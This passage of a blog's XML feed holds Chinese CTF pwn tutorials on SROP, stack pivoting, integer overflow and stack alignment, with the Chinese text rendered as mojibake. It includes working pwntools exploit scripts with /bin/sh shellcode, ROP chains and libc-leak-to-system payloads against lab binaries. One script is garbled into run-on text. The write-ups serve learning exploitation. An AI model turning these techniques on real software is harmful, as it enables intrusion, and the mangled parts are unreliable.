src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180210.png" alt="Pasted image 20250207180210"></p><p><strong><em>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ç›®å‰çš„ pwntools ä¸­å·²ç»é›†æˆäº†å¯¹äº srop çš„æ”»å‡»ã€‚</em></strong><br>pwntoolsé›†æˆäº†æœ‰å…³SROPé“¾çš„æ„é€ å‡½æ•° <code>SigreturnFrame()</code><br>å·¥å…·æ„é€ å’Œåˆ©ç”¨å¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = </span><br><span class="line">frame.rdi = </span><br><span class="line">frame.rsi = </span><br><span class="line">frame.rdx = </span><br><span class="line">frame.rcx = </span><br><span class="line">frame.rip = </span><br><span class="line">frame.rsp =</span><br></pre></td></tr></table></figure><br>ç”¨ä¸å‚ä¸æ ˆå¸ƒå±€çš„æ„é€ <br>åœ¨payloadæ„é€ ä¸­åˆ©ç”¨bytes(frame)åŒ…è£¹å³å¯</p><h3 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/srop/2016-360%E6%98%A5%E7%A7%8B%E6%9D%AF-srop">ctf-challenges/pwn/stackoverflow/srop/2016-360æ˜¥ç§‹æ¯-srop at master Â· ctf-wiki/ctf-challenges</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNæŠ€å·§-æ ˆè¿ç§»</title>
      <link href="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/max1z/p/15299000.html">æ ˆè¿ç§»åŸç†ä»‹ç»ä¸åº”ç”¨ - Max1z - åšå®¢å›­</a></p><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>æˆ‘ä»¬é¦–å…ˆä»‹ç»ä¸€ä¸‹Stack pivotingçš„å«ä¹‰ï¼š<strong><em>è¯¥æŠ€å·§å°±æ˜¯åŠ«æŒæ ˆæŒ‡é’ˆæŒ‡å‘æ”»å‡»è€…æ‰€èƒ½æ§åˆ¶çš„å†…å­˜å¤„</em></strong>ï¼Œç„¶åå†åœ¨ç›¸åº”çš„ä½ç½®è¿›è¡ŒROPã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬å¯èƒ½åœ¨ä»¥ä¸‹æƒ…å†µéœ€è¦ä½¿ç”¨stack pivoting:</p><ul><li>å¯ä»¥æ§åˆ¶çš„æ ˆæº¢å‡ºçš„å­—èŠ‚æ•°è¾ƒå°‘ï¼Œéš¾ä»¥æ„é€ è¾ƒé•¿çš„ROPé“¾</li><li>å¼€å¯äº†PIEä¿æŠ¤ï¼Œæ ˆåœ°å€æœªçŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ˆåŠ«æŒåˆ°å·²çŸ¥çš„åŒºåŸŸã€‚</li><li>å…¶å®ƒæ¼æ´éš¾ä»¥åˆ©ç”¨ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œè½¬æ¢ï¼Œæ¯”å¦‚è¯´å°†æ ˆåŠ«æŒåˆ°å †ç©ºé—´ï¼Œä»è€Œåœ¨å †ä¸Šå†™ropåŠè¿›è¡Œå †æ¼æ´åˆ©ç”¨<br>æ­¤å¤–ï¼Œåˆ©ç”¨ stack pivotingæœ‰ä»¥ä¸‹å‡ ä¸ª<strong>è¦æ±‚</strong>ï¼š</li><li>å¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</li><li>å¯ä»¥æ§åˆ¶spæŒ‡é’ˆã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ§åˆ¶æ ˆæŒ‡é’ˆä¼šä½¿ç”¨ROPï¼Œå¸¸è§çš„æ§åˆ¶æ ˆæŒ‡é’ˆçš„gadgetsä¸€èˆ¬æ˜¯<code>pop rsp/esp</code><br>å½“ç„¶ï¼Œè¿˜ä¼šæœ‰ä¸€äº›å…¶å®ƒçš„å§¿åŠ¿ã€‚æ¯”å¦‚è¯´libc_csu_initä¸­çš„gadgetsï¼Œæˆ‘ä»¬é€šè¿‡åç§»å°±å¯ä»¥å¾—åˆ°æ§åˆ¶rspæŒ‡é’ˆ<br>ä¸Šé¢æ˜¯æ­£å¸¸çš„ï¼Œä¸‹é¢æ˜¯åç§»çš„<br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217164554.png" alt="Pasted image 20250217164554"><br>æ­¤å¤–ï¼Œè¿˜æœ‰æ›´åŠ é«˜çº§çš„ fake frame</li><li>å­˜åœ¨å¯ä»¥æ§åˆ¶å†…å®¹çš„å†…å­˜ï¼Œä¸€èˆ¬æœ‰å¦‚ä¸‹</li><li>bssæ®µã€‚ç”±äºè¿›ç¨‹æŒ‰é¡µåˆ†é…å†…å­˜ï¼Œåˆ†é…ç»™bssæ®µçš„å†…å­˜å¤§å°è‡³å°‘ä¸€ä¸ªé¡µ(4kï¼Œ0x1000)å¤§å°ã€‚ç„¶è€Œä¸€èˆ¬bssæ®µçš„å†…å®¹ç”¨ä¸äº†è¿™ä¹ˆå¤šçš„ç©ºé—´ï¼Œå¹¶ä¸”bssæ®µåˆ†é…çš„å†…å­˜é¡µæ‹¥æœ‰è¯»å†™æƒé™ã€‚</li><li>heapã€‚ä½†æ˜¯è¿™ä¸ªéœ€è¦æˆ‘ä»¬èƒ½å¤Ÿæ³„éœ²å †åœ°å€</li></ul><h2 id="ç¤ºä¾‹1"><a href="#ç¤ºä¾‹1" class="headerlink" title="ç¤ºä¾‹1"></a>ç¤ºä¾‹1</h2><blockquote><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w">ctf-challenges/pwn/stackoverflow/stackprivot/X-CTF Quals 2016 - b0verfl0w at master Â· ctf-wiki/ctf-challenges</a></p></blockquote><p>32ä½ï¼Œä¿æŠ¤å…¨å…³ï¼Œæ³ªç›®<img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217165404.png" alt="Pasted image 20250217165404"></p><p>æœ‰è¾“å…¥ç‚¹,æµ‹ä¸€ä¸‹åç§»<br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217170719.png" alt="Pasted image 20250217170719"></p><p>36ä¸ªå¯ä»¥è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œ32ä¸ªè¦†ç›–åˆ°ebp(æ ˆåº•)<br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217182115.png" alt="Pasted image 20250217182115"></p><p>åªèƒ½æº¢å‡º14ä¸ªå­—èŠ‚ï¼Œå¾ˆéš¾æ‰§è¡Œä¸€äº›æ¯”è¾ƒå¥½çš„ROPï¼Œè€ƒè™‘æ ˆè¿ç§»<br>æ²¡æœ‰å¼€å¯å †æ ˆä¿æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç›´æ¥åœ¨æ ˆä¸Šå¸ƒç½®shellcodeå¹¶æ‰§è¡Œ<br>æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>åˆ©ç”¨æ ˆæº¢å‡ºå¸ƒç½®shellcode</li><li>æ§åˆ¶eipæŒ‡å‘shellcodeå¤„<blockquote><p>payloadçš„é•¿åº¦ä¸º44å­—èŠ‚ï¼Œå…¶ä¸­çš„shellcode_x86é•¿åº¦ä¸º22å­—èŠ‚ï¼Œä¸èƒ½ç›´æ¥å°†shellcodeæ³¨å…¥æ ˆä¸­ï¼Œå¦åˆ™ä¼šç ´åæ ˆ</p></blockquote></li></ul><p>å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºå¯¹espè¿›è¡Œæ“ä½œï¼Œä½¿å…¶æŒ‡å‘shellcodeå¤„ï¼Œå¹¶ä¸”ç›´æ¥æ§åˆ¶ç¨‹åºè·³è½¬è‡³espå¤„ã€‚é‚£ä¸‹é¢å°±æ˜¯æ‰¾æ§åˆ¶ç¨‹åºè·³è½¬åˆ°espçš„gadgetsäº†<br>æˆ‘ä»¬æœç´¢ä¸€ä¸‹å¯ä»¥æ§åˆ¶ç¨‹åºè·³è½¬åˆ°espå¤„çš„gadget<img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217193710.png" alt="Pasted image 20250217193710">æˆ‘ä»¬éœ€è¦jmp esp<br>å› æ­¤å°†shellcodeå¸ƒå±€å¦‚ä¸‹<br><strong>shellcode</strong>|<strong>padding</strong>|<strong>fake epb</strong>|<strong>0x08048504</strong>|<strong>set esp point to shellcode and jmp esp</strong>|<br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217205904.png" alt="Pasted image 20250217205904"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./b0verfl0w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_x86 = <span class="string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">b&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)</span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">payload = shellcode_x86 + (</span><br><span class="line">    <span class="number">0x20</span> - <span class="built_in">len</span>(shellcode_x86)) * <span class="string">b&#x27;b&#x27;</span> + <span class="string">b&#x27;bbbb&#x27;</span> + p32(jmp_esp) + sub_esp_jmp</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217180521.png" alt="Pasted image 20250217180521"><br>å…ˆæŠŠå­—èŠ‚ç è½¬ä¸ºæ±‡ç¼–<br><strong><em>getshell!</em></strong><br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217210219.png" alt="Pasted image 20250217210219"></p><h2 id="ç¤ºä¾‹2-x86"><a href="#ç¤ºä¾‹2-x86" class="headerlink" title="ç¤ºä¾‹2(x86)"></a>ç¤ºä¾‹2(x86)</h2><blockquote><p>å‚è€ƒ:<a href="https://blog.csdn.net/qq_38154820/article/details/106330238">32ä½ä»¥åŠ64ä½æ ˆè¿ç§»çš„å…·ä½“åˆ†æä¸å­¦ä¹ -CSDNåšå®¢</a><br><a href="https://www.yuque.com/wendyjellybeans/mhpnug/lcfyf0#VAWnD">Hitcon-Training lab1-lab15</a></p></blockquote><p>æ ˆè¿ç§»çš„æŠ€æœ¯ï¼Œåˆ†ä¸º32ä½å’Œ64ä½ELFï¼Œæˆ‘ä»¬å…ˆæ¥å­¦ä¹ 32ä½æ ˆè¿ç§»<br>æ˜ç¡®ä¸€ä¸ªè§‚ç‚¹ï¼Œ<strong>æ ˆçš„å†…å®¹å³ç¨‹åºEIPæ‰§è¡Œçš„æµç¨‹(å› ä¸ºæˆ‘ä»¬æ€»æ˜¯è¦†ç›–å‡½æ•°çš„è¿”å›åœ°å€)</strong><br><strong>æ ˆä¸­çš„å†…å®¹éƒ½æ˜¯</strong>æ ˆï¼šå‡½æ•° è¿”å›åœ°å€ å‚æ•°</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æ ˆè¿ç§»æ­£å¦‚å®ƒæ‰€æè¿°çš„ï¼Œè¯¥æŠ€å·§å°±æ˜¯åŠ«æŒæ ˆæŒ‡é’ˆæŒ‡å‘æ”»å‡»è€…æ‰€èƒ½æ§åˆ¶çš„å†…å­˜å¤„ï¼Œç„¶åå†åœ¨ç›¸åº”çš„ä½ç½®è¿›è¡Œ ROPã€‚æˆ‘ä»¬å¯åˆ©ç”¨è¯¥æŠ€å·§<strong>æ¥è§£å†³æ ˆæº¢å‡ºç©ºé—´å¤§å°ä¸è¶³çš„é—®é¢˜</strong>ã€‚<br>æˆ‘ä»¬è¿›å…¥ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œä¼šæ‰§è¡ŒcallæŒ‡ä»¤<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">call <span class="title function_">func</span><span class="params">()</span>;    <span class="comment">//push eip+4;  push ebp;   mov ebp,esp;</span></span><br></pre></td></tr></table></figure><br>call func() æ‰§è¡Œå®Œè¦é€€å‡ºçš„æ—¶å€™è¦è¿›è¡Œä¸call funcç›¸åçš„æ“ä½œï¼ˆæ¢å¤ç°åœºï¼‰ç»´æŒæ ˆå¹³è¡¡ï¼<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">leave;          <span class="comment">//mov esp,ebp;  pop ebp;</span></span><br><span class="line">ret ;            <span class="comment">// pop eip</span></span><br></pre></td></tr></table></figure><br>æ ˆè¿ç§»çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯å°†æ ˆ çš„esp å’Œ ebp è½¬ç§»åˆ°ä¸€ä¸ªè¾“å…¥ä¸å—é•¿åº¦é™åˆ¶çš„ä¸”å¯æ§åˆ¶çš„åœ°å€å¤„ï¼Œé€šå¸¸æ˜¯ bss æ®µåœ°å€ã€‚<br>åœ¨æœ€året çš„æ—¶å€™  å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶æ ˆé¡¶ espæŒ‡å‘çš„åœ°å€å°±æƒ³åˆ°æ§åˆ¶äº†ç¨‹åºæ‰§è¡Œæµï¼<br><a href="https://blog.csdn.net/yuanyunfeng3/article/details/51456049">æ ˆçš„è¿ç§»æŠ€å·§åœ¨CTF pwnæŒ‘æˆ˜ä¸­çš„åº”ç”¨-CSDNåšå®¢</a></p><p>xxxxxxxxxx28 1from pwn import <em>2context(os=â€™linuxâ€™, arch=â€™amd64â€™, log_level=â€™debugâ€™)3â€‹4io = process(â€˜./pwn2â€™)5elf = ELF(â€˜./pwn2â€™)6â€‹7vul = 0x4009E78write = 0x4009DD9â€‹10pop_rdi = 0x4014c611pop_rsi = 0x4015e712pop_rdx = 0x44262613jmp_rsi = 0x4a331314mov_rdi_esi = 0x47a3b315â€‹16payload  = â€œAâ€</em>0x8817payload += p64(pop_rsi) + p64(7) + p64(pop_rdi) + p64(elf.sym[â€˜<strong>stack_protâ€™]) + p64(mov_rdi_esi)18payload += p64(pop_rdi) + p64(elf.sym[â€˜</strong>libc_stack_endâ€™]) + p64(elf.sym[â€˜_dl_make_stack_executableâ€™])19payload += p64(vul)20â€‹21io.sendlineafter(â€˜welcome~\nâ€™, payload)22â€‹23shellcode = asm(shellcraft.sh())24payload = shellcode.ljust(0x88, â€œAâ€) + p64(jmp_rsi)25â€‹26io.sendline(payload)27â€‹28io.interactive()python</p><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><p><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250218144214.png" alt="Pasted image 20250218144214"><br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250218163306.png" alt="Pasted image 20250218163306"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pay1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p32(buf)+p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2=p32(buf1)+p32(puts_plt)+p32(pop_ebx_ret)+p32(puts_got)</span><br><span class="line">payload2+=p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf1)+p32(<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload3=p32(buf)+p32(read_plt)+p32(pop3ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br><span class="line">payload3+=p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(buf)</span><br></pre></td></tr></table></figure><p>å…·ä½“æµç¨‹è¯¦è§excel<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./migration&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./migration&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span>  </span><br><span class="line"></span><br><span class="line">buf=elf.bss()+<span class="number">0x500</span></span><br><span class="line">buf1=elf.bss()+<span class="number">0x400</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf1))</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leave_ret=<span class="number">0x08048504</span></span><br><span class="line"><span class="comment"># 0x08048504 : leave ; ret</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p32(buf)+p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;best :\n&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_ebx_ret=<span class="number">0x804836d</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2=p32(buf1)+p32(puts_plt)+p32(pop_ebx_ret)+p32(puts_got)</span><br><span class="line">payload2+=p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf1)+p32(<span class="number">0x100</span>)</span><br><span class="line">  </span><br><span class="line">io.sendline(payload2)</span><br><span class="line">  </span><br><span class="line">puts_addr=u32(io.recv(<span class="number">4</span>))  </span><br><span class="line">success(<span class="string">&quot;puts_addr ==&gt; &quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">  </span><br><span class="line">pop3ret=<span class="number">0x08048569</span></span><br><span class="line">payload3=p32(buf)+p32(read_plt)+p32(pop3ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br><span class="line">payload3+=p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(buf)</span><br><span class="line"></span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ ˆ </tag>
            
            <tag> PWNæŠ€å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNå…¥é—¨-æ•´æ•°æº¢å‡º</title>
      <link href="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
      <url>/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºæœ¬æ•°æ®ç±»å‹"><a href="#åŸºæœ¬æ•°æ®ç±»å‹" class="headerlink" title="åŸºæœ¬æ•°æ®ç±»å‹"></a>åŸºæœ¬æ•°æ®ç±»å‹</h2><p>å†è¯´æ•´æ•°æº¢å‡ºä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆçš„å…ˆæ¥è¯´ä¸€ä¸‹Cè¯­è¨€ä¸­çš„æ•´å‹çš„æ•°æ®åˆ†ç±»ã€‚<br>æŒ‰<strong>æ•°æ®ç±»å‹</strong>åˆ†ç±»ä¸»è¦åˆ†ä¸‰ç±»ï¼šçŸ­æ•´å‹ï¼ˆshort)ã€æ•´å‹(int)ã€é•¿æ•´å‹(long)<br>æŒ‰<strong>ç¬¦å·</strong>åˆ†ç±»ï¼šæœ‰ç¬¦å·ã€æ— ç¬¦å·<br>å¹¶ä¸”æ¯ç§æ•°æ®ç±»å‹éƒ½æœ‰è‡ªå·±çš„å¤§å°èŒƒå›´<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/image-20250119185759490.png" alt="image-20250119185759490"><br><strong>æ•´å½¢ï¼š</strong></p><p><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250214231319.png" alt="Pasted image 20250214231319"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> b = <span class="number">65537</span>;</span><br><span class="line">    <span class="keyword">if</span>(a == b)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Int overflow successfully!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘<br><code>gcc -g test.c -o test</code><br>è¿è¡Œä¸€ä¸‹ç¨‹åºè¾“å‡ºInt overflow successfully!<br>unsigned short intçš„èŒƒå›´æ˜¯0~65535ï¼Œå¯¹å˜é‡bçš„èµ‹å€¼è¶…è¿‡äº†è¿™ä¸ªèŒƒå›´ï¼Œå› æ­¤hexçš„æ•°æ®æœ€é«˜ä½è¢«æˆªæ–­ï¼Œä»è€Œå˜æˆäº†0x0001=1</p><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><p><a href="https://www.52pojie.cn/thread-1032448-1-1.html">XCTFæ”»é˜²ä¸–ç•Œint_overflow - å¾çˆ±ç ´è§£ - 52pojie.cn</a><br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215181914.png" alt="Pasted image 20250215181914"><br>åªå¼€NX(æ ˆä¸Šä¸å¯æ‰§è¡Œä¿æŠ¤)ï¼Œç›¸å½“äºæ²¡æœ‰å¼€ä¿æŠ¤<br>æ”¾å…¥IDAä¸­<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215182050.png" alt="Pasted image 20250215182050"><br>mainå‡½æ•°é€‰æ‹©åŠŸèƒ½ï¼Œæ¯”è¾ƒç®€å•ï¼Œçœ‹çœ‹loginï¼Œä¸¤ä¸ªå¯ä»¥åˆ©ç”¨çš„read<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215182113.png" alt="Pasted image 20250215182113"></p><blockquote><p>çœ‹loginå‡½æ•°ï¼Œ0x19uè¡¨ç¤ºæ— ç¬¦å·æ•°</p></blockquote><p>çœ‹çœ‹check_passwdå‡½æ•°<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215182313.png" alt="Pasted image 20250215182313"></p><ul><li>unsigned__int8è¡¨ç¤º8bitæ— ç¬¦å·æ•´æ•°ï¼Œå¯èƒ½å­˜åœ¨æ•´æ•°æº¢å‡º</li><li>max_passwdä¸º0x199ï¼Œæ•°æ®è¿‡å¤§</li><li>é€šè¿‡æ•´æ•°æº¢å‡ºï¼Œå¯å°†v2å®é™…é•¿åº¦(260-264)æˆªæ–­å˜æˆ(4-8)<br>åŒæ—¶è¿˜èƒ½æ‰¾åˆ°ä¸€ä¸ªåé—¨å‡½æ•°<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215182359.png" alt="Pasted image 20250215182359"><br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215185941.png" alt="Pasted image 20250215185941"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./IntOverflow&quot;</span>)  </span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;username:\n&quot;</span>,<span class="string">&quot;zechariah&quot;</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x08048694</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x18</span>  + p32(cat_flag_addr) + <span class="string">b&quot;A&quot;</span> * <span class="number">234</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;passwd:\n&quot;</span>,payload)</span><br><span class="line"><span class="built_in">print</span> (p.recvall())</span><br></pre></td></tr></table></figure><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215185924.png" alt="Pasted image 20250215185924"><br><strong><em>get shell!</em></strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ•´æ•°æº¢å‡º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNæŠ€å·§-æ ˆå¯¹é½</title>
      <link href="/2025/02/16/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E5%AF%B9%E9%BD%90/"/>
      <url>/2025/02/16/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E5%AF%B9%E9%BD%90/</url>
      
        <content type="html"><![CDATA[<p><strong>ï¼ˆUbuntu 18.04ç‰ˆæœ¬åŠä»¥ä¸Šéœ€è€ƒè™‘ ï¼‰</strong></p><h2 id="ç½ªé­ç¥¸é¦–"><a href="#ç½ªé­ç¥¸é¦–" class="headerlink" title="ç½ªé­ç¥¸é¦–"></a>ç½ªé­ç¥¸é¦–</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">movaps xmmword ptr [rsp + 0x50], xmm0</span><br></pre></td></tr></table></figure><p>ä» <a href="https://link.zhihu.com/?target=https%3A//www.felixcloutier.com/x86/movaps">https://www.felixcloutier.com/x86/movaps</a> å¤„æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œè¿™æ¡æŒ‡ä»¤çš„åŠŸèƒ½æ˜¯ï¼š <strong>å°†xmm0ä¸­ä¿å­˜çš„å•ç²¾åº¦æµ®ç‚¹æ•°ä»xmm0ç§»åŠ¨è‡³åœ°å€[rsp + 0x50]å¤„</strong> ã€‚</p><p>å½“ç„¶ï¼Œæ›´é‡è¦çš„æ˜¯è¿™æ¡æŒ‡ä»¤çš„æ‰§è¡Œæ¡ä»¶ï¼Œè¿™ç›´æ¥å…³ç³»åˆ°ç¨‹åºæŠ¥é”™çš„åŸå› ã€‚åŸæ–‡ä¸­å¯¹æ‰§è¡Œæ¡ä»¶çš„æè¿°å¦‚ä¸‹ï¼š</p><blockquote><p>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary or a general-protection exception (#GP) will be generated.</p></blockquote><p>æ­¤æ—¶æŠ¥é”™çš„åŸå› 